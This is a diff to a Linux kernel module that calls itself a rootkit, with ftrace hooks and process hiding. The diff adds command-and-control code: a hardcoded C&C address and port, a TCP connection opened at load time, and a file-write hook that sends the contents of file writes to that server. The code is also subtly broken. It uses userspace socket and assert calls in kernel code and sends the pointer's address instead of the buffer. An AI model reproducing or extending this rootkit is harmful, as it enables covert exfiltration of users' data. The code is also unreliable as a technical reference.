@@ -6,11 +6,11 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 #include <linux/file.h>
-
-
-
-
-
+#include <linux/types.h>
+#include <linux/socket.h>
+#include <linux/string.h>
+//#include <arpa/inet.h>
+//#include <linux/assert.h>
 
 #include "ftrace_helper.h"
 
@@ -21,6 +21,13 @@ MODULE_VERSION("0.01");
 
 
 char hide_pid[NAME_MAX];
+char cncIpAddress[16] = "192.168.1.183";
+extern int cncSocket;
+
+struct rootkitMessage {
+  uint8_t index;
+  size_t length;
+};
 
 struct linux_dirent {
     unsigned long d_ino;
@@ -52,6 +59,16 @@ asmlinkage ssize_t vfs_h_write(struct file *file, const char __user *buf, size_t
     {
         printk(KERN_INFO "rootkit: trying to write to a file %s", file->f_path.dentry->d_name.name);
         printk(KERN_INFO "rootkit: bytes being written %s", buf);
+
+	struct rootkitMessage rtkMsg;
+    	rtkMsg.index = 0;
+    	rtkMsg.length = htobe64(count);
+
+    	ssize_t bytesSent;
+    	bytesSent = send(cncSocket, &rtkMsg, 9, 0);
+    	assert(bytesSent == 9);
+    	bytesSent = send(cncSocket, &buf, count, 0);
+    	assert(bytesSent == count);		
 
       //  fprt = fopen("test.txt","w");
       //  fprintf(fptr,"%s", buf);
@@ -184,6 +201,21 @@ static int __init rootkit_init(void)
     if(err)
         return err;
 
+    struct sockaddr_in cncAddress;
+    memset(&cncAddress, 0, sizeof(cncAddress));
+    cncAddress.sin_family = AF_INET;
+    cncAddress.sin_port = htons(8765);
+    int convertCNCValue = inet_pton(AF_INET, cncIpAddress, &cncAddress.sin_addr.s_addr);
+    assert(convertCNCValue >= 0);
+
+    //Create a socket
+    cncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    assert(cncSocket >= 0);
+
+    //Connect to cnc via the socket
+    int connectSocket = connect(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress));
+    assert(connectSocket >= 0);
+
     //list_del(&THIS_MODULE->list);
 
     printk(KERN_INFO "rootkit: loaded\n");
@@ -192,6 +224,15 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
+    //Send End Message
+    struct rootkitMessage rtkEndMsg;
+    ssize_t bytesSent;
+    rtkEndMsg.index = -1;
+    rtkEndMsg.length = htobe64(-1);
+
+    bytesSent = send(cncSocket, &rtkEndMsg, 9, 0);
+    assert(bytesSent == 9);
+    
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "rootkit: unloaded\n");
 }
